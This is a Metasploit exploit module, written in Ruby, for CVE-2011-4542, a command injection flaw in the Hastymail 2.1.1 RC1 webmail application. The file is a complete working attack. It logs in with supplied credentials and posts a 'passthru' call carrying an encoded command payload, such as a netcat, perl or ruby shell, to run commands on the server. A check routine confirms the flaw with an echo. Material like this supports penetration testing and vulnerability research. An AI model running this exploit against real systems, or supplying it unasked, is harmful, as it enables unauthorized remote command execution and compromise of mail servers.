# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Hastymail 2.1.1 RC1 Command Injection",
            &#039;Description&#039;    => %q{
                    This module exploits a command injection vulnerability found in Hastymail
                2.1.1 RC1 due to the insecure usage of the call_user_func_array() function on
                the "lib/ajax_functions.php" script. Authentication is required on Hastymail
                in order to exploit the vulnerability. The module has been successfully tested
                on Hastymail 2.1.1 RC1 over Ubuntu 10.04.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Bruno Teixeira&#039;, # Vulnerability Discovery
                    &#039;juan vazquez&#039; # Metasploit module
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2011-4542&#039; ],
                    [ &#039;BID&#039;, &#039;50791&#039; ],
                    [ &#039;OSVDB&#039;, &#039;77331&#039; ],
                    [ &#039;URL&#039;, &#039;https://www.dognaedis.com/vulns/DGS-SEC-3.html&#039; ]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                            &#039;RequiredCmd&#039; => &#039;generic perl ruby netcat-e&#039;,
                        }
                },
            &#039;Platform&#039;       => [&#039;unix&#039;],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Targets&#039;        =>
                [
                    [&#039;Hastymail 2.1.1 RC1&#039;, {}]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Nov 22 2011",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [true, "The base path to Hastymail", "/hastymail2/"]),
                OptString.new(&#039;USER&#039;, [true, "The username to authenticate with", ""]),
                OptString.new(&#039;PASS&#039;, [true, "The password to authenticate with", ""])
            ], self.class)
    end
 
 
    def check
        @uri = target_uri.path
        @uri << &#039;/&#039; if @uri[-1,1] != &#039;/&#039;
        @session_id = ""
        @peer = "#{rhost}:#{rport}"
 
        login
 
        if not @session_id or @session_id.empty?
            print_error "#{@peer} - Authentication failed"
            return Exploit::CheckCode::Unknown
        end
 
        test = rand_text_alpha(rand(4) + 4)
        data = "rs=passthru&"
        data << "rsargs[]=#{rand_text_alpha(rand(4) + 4)}&"
        data << "rsargs[]=echo #{test}"
        res = send_request_cgi({
            &#039;method&#039; => &#039;POST&#039;,
            &#039;uri&#039; => "#{@uri}",
            &#039;Cookie&#039; => @session_id,
            &#039;data&#039; => data
        })
 
        if res and res.code == 200 and res.body =~ /#{test}/
            return Exploit::CheckCode::Vulnerable
        else
            return Exploit::CheckCode::Safe
        end
    end
 
    def login
        res = send_request_cgi({
            &#039;method&#039; => &#039;POST&#039;,
            &#039;uri&#039;    => "#{@uri}?page=login",
            &#039;vars_post&#039; =>
            {
                &#039;user&#039; => datastore[&#039;USER&#039;],
                &#039;pass&#039; => datastore[&#039;PASS&#039;],
                &#039;login&#039; => &#039;Login&#039;
            }
        })
 
        if res and res.code == 303
            @session_id = res["Set-Cookie"]
            print_good "#{@peer} - Authentication successfully"
        end
    end
 
    def exploit
        @uri = target_uri.path
        @uri << &#039;/&#039; if @uri[-1,1] != &#039;/&#039;
        @session_id = ""
        @peer = "#{rhost}:#{rport}"
 
        print_status "#{@peer} - Trying login"
        login
 
        if not @session_id or @session_id.empty?
            print_error "#{@peer} - Authentication failed"
            return
        end
 
        print_status "#{@peer} - Authentication successfully, trying to exploit"
 
        data = "rs=passthru&"
        data << "rsargs[]=#{rand_text_alpha(rand(4) + 4)}&"
        data << "rsargs[]=#{payload.encoded}"
 
        res = send_request_cgi({
            &#039;method&#039; => &#039;POST&#039;,
            &#039;uri&#039; => "#{@uri}",
            &#039;Cookie&#039; => @session_id,
            &#039;headers&#039; => {
                &#039;Cmd&#039; => Rex::Text.encode_base64(payload.encoded)
            },
            &#039;data&#039; => data
        })
 
        if not res or res.code != 200 or not res.body =~ /\+/
            print_error "#{@peer} - Exploitation failed"
            return
        end
 
    end
 
 
end



